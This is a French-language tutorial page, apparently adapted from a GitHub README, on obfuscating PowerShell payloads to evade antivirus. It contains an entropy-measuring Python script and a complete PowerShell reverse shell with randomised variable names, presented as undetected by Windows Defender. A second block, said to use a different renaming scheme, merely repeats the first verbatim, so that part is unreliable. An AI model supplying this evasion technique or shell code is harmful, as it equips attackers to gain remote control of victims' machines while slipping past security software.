Source : https://github.com/t3l3machus/PowerShell-Obfuscation-Bible/blob/main/README.md

L'**obfuscation** est le fait de **rendre** un payload **plus obscure** afin d'**évader** les protections **Antivirus**.

## __Entropie__

L'**entropie** est une notion mathématique qui vise à **mesurer** à quel point un **payload est aléatoire**, si une chaine est composé exclusivement d'un seul caractère son entropie sera 0, **plus il y a de caractère différent plus l'entropie va augmenter**, le calcul prend aussi en compte la **fréquence d'apparition** de ces caractères.

Pour la calculer on a implémenté la **formule de Claude E. Shannon** en python :

```python
#!/bin/python3
# Usage: python3 entropy.py <file>

import math, sys

def entropy(string):
    "Calculates the Shannon entropy of a UTF-8 encoded string"

    # decode the string as UTF-8
    unicode_string = string.decode('utf-8')

    # get probability of chars in string
    prob = [ float(unicode_string.count(c)) / len(unicode_string) for c in dict.fromkeys(list(unicode_string)) ]

    # calculate the entropy
    entropy = - sum([ p * math.log(p) / math.log(2.0) for p in prob ])

    return entropy


f = open(sys.argv[1], 'rb')
content = f.read()
f.close()

print(entropy(content))
```

![[Entropy1.png]]


## __Identify Detection Triggers__

Avant d'effectuer une tentative d'obscusissement du code, il faut **savoir ce qui déclanche l'alerte**, pour se faire, on peut utiliser **[AMSITrigger](https://github.com/RythmStick/AMSITrigger)**.

On peut également le faire à la main en regardant les erreurs.


## __Rename Objects__

Il est important de renommer le nom de nos variables en respectant le concept de [Entropie](PowerShell_Obfuscation.md#__Entropie__), cela rend le travail plus difficile pour les antivirus.

Voici un code détecté par les antivirus classique dont windows defender :

![[renameObj1.png]]

En remplaçant le nom des variables ainsi que **`(pwd).Path`** par **`$(gl)`**, on obtient un code que les antivirus ne découvre pas. 

```powershell
$84b5d7ab8755451cb386a79589e39fa8 = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181); $3b95c1d3d7dc4e4fa6474ce1bceae743 = $84b5d7ab8755451cb386a79589e39fa8.GetStream(); [byte[]] $367ad63a4a834bf5bb275aab24a4890c = 0..65535|%{0}; while(($d084ee484cf44c09b003024847840f3d = $3b95c1d3d7dc4e4fa6474ce1bceae743.Read($367ad63a4a834bf5bb275aab24a4890c, 0, $367ad63a4a834bf5bb275aab24a4890c.Length)) -ne 0){; $b16fd2353f0d413484e1583776256f61 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($367ad63a4a834bf5bb275aab24a4890c,0, $d084ee484cf44c09b003024847840f3d); $b396f8bb13ec47c28e4f721085e95361 = (iex $b16fd2353f0d413484e1583776256f61 2>&1 | Out-String ); $2bfb84697b834fa09479071ec68d6b19 = $b396f8bb13ec47c28e4f721085e95361 + 'PS' + $(gl) + '> '; $12e0e1f0c5e14474b53907ee11f75ed7 = ([text.encoding]::ASCII).GetBytes($2bfb84697b834fa09479071ec68d6b19); $3b95c1d3d7dc4e4fa6474ce1bceae743.Write($12e0e1f0c5e14474b53907ee11f75ed7,0, $12e0e1f0c5e14474b53907ee11f75ed7.Length);$3b95c1d3d7dc4e4fa6474ce1bceae743.Flush()}; $84b5d7ab8755451cb386a79589e39fa8.Close()
```

On peut également remplacer le nom des variables par x * 'f', ce qui donnerai quelques choses comme :

```powershell
$84b5d7ab8755451cb386a79589e39fa8 = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181); $3b95c1d3d7dc4e4fa6474ce1bceae743 = $84b5d7ab8755451cb386a79589e39fa8.GetStream(); [byte[]] $367ad63a4a834bf5bb275aab24a4890c = 0..65535|%{0}; while(($d084ee484cf44c09b003024847840f3d = $3b95c1d3d7dc4e4fa6474ce1bceae743.Read($367ad63a4a834bf5bb275aab24a4890c, 0, $367ad63a4a834bf5bb275aab24a4890c.Length)) -ne 0){; $b16fd2353f0d413484e1583776256f61 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($367ad63a4a834bf5bb275aab24a4890c,0, $d084ee484cf44c09b003024847840f3d); $b396f8bb13ec47c28e4f721085e95361 = (iex $b16fd2353f0d413484e1583776256f61 2>&1 | Out-String ); $2bfb84697b834fa09479071ec68d6b19 = $b396f8bb13ec47c28e4f721085e95361 + 'PS' + $(gl) + '> '; $12e0e1f0c5e14474b53907ee11f75ed7 = ([text.encoding]::ASCII).GetBytes($2bfb84697b834fa09479071ec68d6b19); $3b95c1d3d7dc4e4fa6474ce1bceae743.Write($12e0e1f0c5e14474b53907ee11f75ed7,0, $12e0e1f0c5e14474b53907ee11f75ed7.Length);$3b95c1d3d7dc4e4fa6474ce1bceae743.Flush()}; $84b5d7ab8755451cb386a79589e39fa8.Close()
```